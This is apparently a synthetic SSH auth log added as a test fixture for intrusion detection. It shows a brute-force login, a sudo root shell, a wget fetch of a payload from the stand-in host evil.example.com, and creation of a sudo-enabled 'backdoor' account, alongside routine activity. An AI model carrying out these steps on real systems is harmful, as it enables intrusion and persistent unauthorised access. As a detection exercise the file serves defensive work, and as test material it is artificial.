@@ -1,0 +1,31 @@
+Aug  1 02:14:01 server sshd[1234]: Failed password for root from 192.168.1.105 port 52341 ssh2
+Aug  1 02:14:03 server sshd[1235]: Failed password for root from 192.168.1.105 port 52342 ssh2
+Aug  1 02:14:05 server sshd[1236]: Failed password for root from 192.168.1.105 port 52343 ssh2
+Aug  1 02:14:07 server sshd[1237]: Failed password for root from 192.168.1.105 port 52344 ssh2
+Aug  1 02:14:09 server sshd[1238]: Failed password for root from 192.168.1.105 port 52345 ssh2
+Aug  1 02:14:11 server sshd[1239]: Failed password for admin from 192.168.1.105 port 52346 ssh2
+Aug  1 02:14:13 server sshd[1240]: Failed password for admin from 192.168.1.105 port 52347 ssh2
+Aug  1 02:14:15 server sshd[1241]: Failed password for ubuntu from 192.168.1.105 port 52348 ssh2
+Aug  1 02:14:17 server sshd[1242]: Failed password for ubuntu from 192.168.1.105 port 52349 ssh2
+Aug  1 02:14:19 server sshd[1243]: Failed password for ubuntu from 192.168.1.105 port 52350 ssh2
+Aug  1 02:14:22 server sshd[1244]: Invalid user deployer from 192.168.1.105 port 52351
+Aug  1 02:14:24 server sshd[1245]: Invalid user git from 192.168.1.105 port 52352
+Aug  1 02:15:01 server sshd[1250]: Accepted password for ubuntu from 192.168.1.105 port 52360 ssh2
+Aug  1 02:15:01 server sshd[1250]: pam_unix(sshd:session): session opened for user ubuntu by (uid=0)
+Aug  1 02:15:30 server sudo: ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/bin/bash
+Aug  1 02:15:45 server sudo: ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/wget http://evil.example.com/payload.sh
+Aug  1 02:16:01 server useradd[1300]: new user: name=backdoor, UID=1001, GID=1001, home=/home/backdoor
+Aug  1 02:16:05 server usermod[1301]: user 'backdoor' added to group 'sudo'
+Aug  1 02:30:00 server sshd[2000]: Failed password for alice from 10.0.0.55 port 41000 ssh2
+Aug  1 02:30:02 server sshd[2001]: Failed password for alice from 10.0.0.55 port 41001 ssh2
+Aug  1 02:30:04 server sshd[2002]: Failed password for alice from 10.0.0.55 port 41002 ssh2
+Aug  1 08:00:01 server sshd[3000]: Accepted password for alice from 10.0.0.10 port 33000 ssh2
+Aug  1 08:00:15 server sudo: alice : TTY=pts/1 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/apt update
+Aug  1 09:10:00 server sshd[3100]: Failed password for invalid from 203.0.113.42 port 60000 ssh2
+Aug  1 09:10:02 server sshd[3101]: Failed password for invalid from 203.0.113.42 port 60001 ssh2
+Aug  1 09:10:04 server sshd[3102]: Failed password for invalid from 203.0.113.42 port 60002 ssh2
+Aug  1 09:10:06 server sshd[3103]: Failed password for invalid from 203.0.113.42 port 60003 ssh2
+Aug  1 09:10:08 server sshd[3104]: Failed password for invalid from 203.0.113.42 port 60004 ssh2
+Aug  1 09:10:10 server sshd[3105]: Failed password for invalid from 203.0.113.42 port 60005 ssh2
+Aug  1 12:00:00 server sshd[4000]: Accepted password for bob from 10.0.0.20 port 44000 ssh2
+Aug  1 12:00:30 server sudo: bob : TTY=pts/2 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/bin/systemctl restart apache2
